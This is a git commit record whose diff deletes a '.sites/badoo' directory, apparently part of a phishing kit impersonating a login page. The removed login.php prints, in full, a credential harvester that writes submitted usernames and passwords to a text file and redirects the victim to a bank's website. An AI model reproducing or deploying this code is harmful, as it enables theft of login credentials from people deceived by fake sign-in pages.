1573af2c89f1d2a768013c1a7b83ec5358c14c99
dasd23d <castrofabrici256@gmail.com>
2025-04-10 20:11:12 -0600

    Delete .sites/badoo directory

--- .sites/badoo/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Username: " . $_POST['user'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.baccredomatic.com/es-hn');
-exit();
-?>
